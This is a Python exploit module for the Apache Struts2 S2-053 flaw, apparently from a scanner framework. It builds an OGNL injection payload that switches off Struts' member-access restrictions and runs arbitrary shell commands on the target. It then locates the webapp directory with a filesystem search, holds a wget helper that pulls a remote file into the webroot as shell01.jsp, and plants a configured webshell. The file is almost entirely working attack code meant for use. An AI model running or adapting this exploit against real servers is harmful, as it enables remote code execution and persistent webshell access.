# coding:utf-8
import sys
import re
from urllib import quote
from struts2.exp_template import Exploit, Level, session

from conf import config
"""
构造函数需要传递以下参数
url   测试目标的url
param poc参数
exp需要实现的方法为meta_info和exploit
create by swm  2018/07/03
done:
获取webpath
执行shell命令，能够使用echo写webpath，也能使用wget下载
"""


class S2053(Exploit):

    def __init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={}, param=''):
        Exploit.__init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={})
        self.param = param

    def meta_info(self):
        return {
            'name': 'S2-053',
            'author': 'swm',
            'date': '2018/07/03'
        }

    def executecmd(self, command):
        payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
        commandurl = "{}/?{}={}".format(self.url, self.param, quote(payload))
        s = session()
        try:
            r = s.get(commandurl, timeout=5)
            resp = r.text.encode("utf-8")
            return resp
        except:
            return False

    # 获取web文件的路径
    def getwebpath(self):
        cmd = 'find / -name *.action'
        re_webpath = re.compile(r'\/.+webapps\/\w+\/')
        str = self.executecmd(cmd)
        webpath = re_webpath.search(str)
        if webpath:
            return webpath.group()
        else:
            self.report('Canot find webpath', Level.error)
            return False

    def wgetfile(self, serverurl, filepath):
        cmd = ''' wget {} -O {}shell01.jsp'''.format(serverurl, filepath)
        response = self.executecmd(cmd)
        return response

    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        # 获取webapp的根目录
        webpath = self.getwebpath()
        if webpath:
            cmd = config['webshell'].format(webpath)
            self.executecmd(cmd)
            return True
        else:
            return False


if __name__ == '__main__':
    url = 'http://127.0.0.1:8085/'
    param = 'name'
    s = S2053(url, param=param)
    res = s.exploit()
    print res
    # if len(sys.argv) == 2:
    #     s = S2DEVMODE(sys.argv[1])
    #     res = s.exploit()
    #     print res
